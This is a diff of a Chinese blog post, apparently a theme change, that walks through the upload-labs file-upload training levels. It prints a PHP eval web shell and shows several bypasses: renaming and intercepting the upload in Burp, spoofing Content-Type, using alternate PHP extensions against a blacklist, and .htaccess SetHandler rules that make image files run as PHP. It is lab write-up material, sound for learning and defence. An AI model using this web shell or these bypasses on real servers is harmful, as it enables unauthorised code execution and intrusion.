@@ -1,381 +1,58 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>文件上传 - Potat0w0</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Potat0w0"><meta name="msapplication-TileImage" content="/img/icon.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Potat0w0"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="文件上传做题记录"><meta property="og:type" content="blog"><meta property="og:title" content="文件上传"><meta property="og:url" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><meta property="og:site_name" content="Potat0w0"><meta property="og:description" content="文件上传做题记录"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/default2.png"><meta property="article:published_time" content="2023-02-09T08:31:05.000Z"><meta property="article:modified_time" content="2024-01-10T09:48:20.560Z"><meta property="article:author" content="Potat0w0"><meta property="article:tag" content="Web"><meta property="article:tag" content="文件上传"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/img/default2.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},"headline":"文件上传","image":["http://example.com/img/default2.png"],"datePublished":"2023-02-09T08:31:05.000Z","dateModified":"2024-01-10T09:48:20.560Z","author":{"@type":"Person","name":"Potat0w0"},"publisher":{"@type":"Organization","name":"Potat0w0","logo":{"@type":"ImageObject","url":"http://example.com/img/icon.jpg"}},"description":"文件上传做题记录"}</script><link rel="canonical" href="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><link rel="icon" href="/img/icon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
 
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
 
-<!DOCTYPE html>
-<html lang="en" data-default-color-scheme=dark>
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
 
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/icon.jpg" alt="Potat0w0" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">时间轴</a><a class="navbar-item" href="/categories">归档</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="fill" src="/img/default2.png" alt="文件上传"></span></div><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-02-09T08:31:05.000Z" title="2023/2/9 16:31:05">2023-02-09</time>发表</span><span class="level-item"><time dateTime="2024-01-10T09:48:20.560Z" title="2024/1/10 17:48:20">2024-01-10</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">常见漏洞</a><span> / </span><a class="link-muted" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a></span><span class="level-item">23 分钟读完 (大约3417个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">文件上传</h1><div class="content"><!-- more -->
 
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
-  <link rel="icon" href="/img/icon.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="Potat0w0">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="uploads-labslevel1创建一个eval.php： 1&lt;?php eval($_POST[&amp;#x27;cmd&amp;#x27;]);?&gt;   被警告了，看一眼前端代码： 12345678910111213141516171819&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;    function checkFile() &amp;#123">
-<meta property="og:type" content="article">
-<meta property="og:title" content="文件上传">
-<meta property="og:url" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
-<meta property="og:site_name" content="Potat0w0">
-<meta property="og:description" content="uploads-labslevel1创建一个eval.php： 1&lt;?php eval($_POST[&amp;#x27;cmd&amp;#x27;]);?&gt;   被警告了，看一眼前端代码： 12345678910111213141516171819&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;    function checkFile() &amp;#123">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182310692.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182602307.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182839790.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807183157792.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807184128488.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807183945951.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807184654061.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808011650457.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808025928958.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808031553494.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808023858250.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808023929151.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808025604587.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808025754424.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808030210926.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808030339898.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033552164.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033629854.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033811143.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033836704.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808035830798.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809014217357.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809020816409.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809020729271.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809020929915.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809021218758.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809021249076.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809021451179.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809023603329.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809023653515.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809023731321.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/test.gif">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810011352229.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810011748800.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/test-1691601488206-3.gif">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810011956749.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810022920827.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810023105203.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810023247221.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810025018910.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810121052870.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810142511762.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810142757428.png">
-<meta property="article:published_time" content="2023-02-09T08:31:05.000Z">
-<meta property="article:modified_time" content="2023-08-10T06:28:47.808Z">
-<meta property="article:author" content="Potat0w0">
-<meta property="article:tag" content="Web">
-<meta property="article:tag" content="文件上传">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182310692.png">
-  
-  
-    <meta name="referrer" content="no-referrer-when-downgrade">
-  
-  
-  <title>文件上传 - Potat0w0</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":50,"cursorChar":"💕","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>Potat0w0&#39;s Blog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                <span>Home</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>Archives</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                <span>Categories</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>Tags</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                <span>About</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                <span>Links</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="文件上传"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-author" aria-hidden="true"></i>
-        Potat0w0
-      </span>
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-02-09 16:31" pubdate>
-          February 9, 2023 pm
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          12k words
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          103 mins
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="busuanzi_container_page_pv" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="busuanzi_value_page_pv"></span> views
-        </span>
-        
-      
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">文件上传</h1>
-            
-              <p class="note note-info">
-                
-                  
-                    Last updated on 5 months ago
-                  
-                
-              </p>
-            
-            
-              <div class="markdown-body">
-                
-                <h2 id="uploads-labs"><a href="#uploads-labs" class="headerlink" title="uploads-labs"></a>uploads-labs</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>创建一个eval.php：</p>
+<h2 id="uploads-labs"><a href="#uploads-labs" class="headerlink" title="uploads-labs"></a>uploads-labs</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>创建一个eval.php：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182310692.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182310692.png"></p>
 <p>被警告了，看一眼前端代码：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;<br>        <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-comment">//定义允许上传的文件类型</span><br>        <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;<br>        <span class="hljs-comment">//提取上传文件的类型</span><br>        <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>        <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>        <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_">indexOf</span>(ext_name) == -<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>            <span class="hljs-title function_">alert</span>(errMsg);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
 <p>前端检验后缀，把eval.php重命名为eval.jpg，bp抓包，改文件名，放行：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182602307.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182602307.png"></p>
 <p>蚁剑连接：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182839790.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182839790.png"></p>
 <h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>同上题一样的改包姿势行不通，不是前端验证，这里存在后端MEME验证，</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807183157792.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807183157792.png"></p>
 <p>这次改Content-Type为允许的类型来绕过</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807184128488.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807184128488.png"></p>
 <p>蚁剑连接</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807183945951.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807183945951.png"></p>
 <p>看一眼后端是怎么验证的：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>))&#123;<br>    <span class="hljs-comment">//TODO</span><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>这次上传php木马后成这样：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807184654061.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807184654061.png"></p>
 <p>常见替代.php后缀有php(1-8)，pHp(1-8)，phtml等等：</p>
 <p>，这里设了个黑名单</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br><span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br></code></pre></td></tr></table></figure>
@@ -388,24 +65,24 @@
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;FilesMatch &quot;eval.jpg&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>
 
 <p>或者如下将所有文件解析为php：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br></code></pre></td></tr></table></figure>
